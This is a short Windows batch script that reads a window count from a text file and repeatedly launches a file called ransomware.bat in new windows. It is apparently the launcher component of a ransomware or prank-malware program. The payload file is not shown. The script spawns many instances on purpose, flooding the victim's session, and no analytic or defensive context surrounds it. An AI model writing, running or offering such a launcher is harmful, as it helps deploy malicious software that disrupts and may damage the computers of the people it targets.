@echo off
color 2
title Starting...

cd saved
set /p MAXIMUMWINDOWS=<maxwindows.txt
cd ..
set COUNTER=0

goto start

:start
set /A COUNTER+=1
if %COUNTER% LEQ %MAXIMUMWINDOWS% goto restart
goto end

:restart
start ransomware.bat
goto start

:end
exit